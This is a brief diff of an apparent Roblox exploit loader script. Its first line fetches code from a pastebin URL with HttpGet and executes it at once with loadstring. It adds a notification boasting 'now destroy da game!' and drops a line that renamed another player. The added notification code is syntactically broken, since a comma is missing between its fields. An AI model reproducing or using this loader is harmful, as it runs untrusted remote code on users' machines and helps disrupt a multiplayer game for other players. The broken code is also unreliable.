@@ -1,2 +1,6 @@
 loadstring(game:HttpGet("https://pastebin.com/raw/jkz6u8Se"))()
-game.Players.hahayoudie_d.Character.Humanoid.DisplayName = "[👑] ayebullet"
+game.Players.LocalPlayer.PlayerGui:WaitForChild("DHScript2")
+game.StarterGui:SetCore("SendNotification", {
+  Title = "Script Loaded"
+  Text = "Script successfully loaded, now destroy da game!"})
+print("LOADED")
